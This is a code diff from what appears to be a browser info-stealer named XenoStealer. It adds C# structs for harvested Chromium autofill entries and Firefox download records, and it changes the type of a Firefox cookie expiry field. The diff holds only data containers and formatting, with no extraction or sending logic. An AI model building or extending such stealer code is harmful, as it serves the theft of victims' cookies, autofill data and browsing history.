@@ -9,6 +9,25 @@ namespace XenoStealer
     public static class DataExtractionStructs
     {
 
+        public struct ChromiumAutoFill
+        {
+            public string name;
+            public string value;
+
+            public ChromiumAutoFill(string _name, string _value)
+            {
+                name = _name;
+                value = _value;
+            }
+
+            public override string ToString()
+            {
+                string result = "NAME: " + name;
+                result += Environment.NewLine;
+                result += "VALUE: " + value;
+                return result;
+            }
+        }
         public struct ChromiumCookie
         {
             public string domain;
@@ -225,12 +244,12 @@ namespace XenoStealer
             public string path;
             public string name;
             public string value;
-            public ulong expiry;
+            public int expiry;
             public bool isSecure;
             public bool isHttpOnly;
             public bool expired;
 
-            public GeckoCookie(string _domain, string _path, string _name, string _value, ulong _expiry, bool _isSecure, bool _isHttpOnly) 
+            public GeckoCookie(string _domain, string _path, string _name, string _value, int _expiry, bool _isSecure, bool _isHttpOnly) 
             { 
                 domain= _domain;
                 path= _path;
@@ -279,6 +298,25 @@ namespace XenoStealer
                 string result = "NAME: " + name;
                 result+= Environment.NewLine;
                 result += "VALUE: " + value;
+                return result;
+            }
+        }
+
+        public struct GeckoDownload 
+        {
+            public string url;
+            public string path;
+            public GeckoDownload(string _url, string _path) 
+            { 
+                path= _path;
+                url = _url;
+            }
+
+            public override string ToString() 
+            {
+                string result = "URL: "+url;
+                result+= Environment.NewLine;
+                result += "DOWNLOAD PATH: " + path;
                 return result;
             }
         }
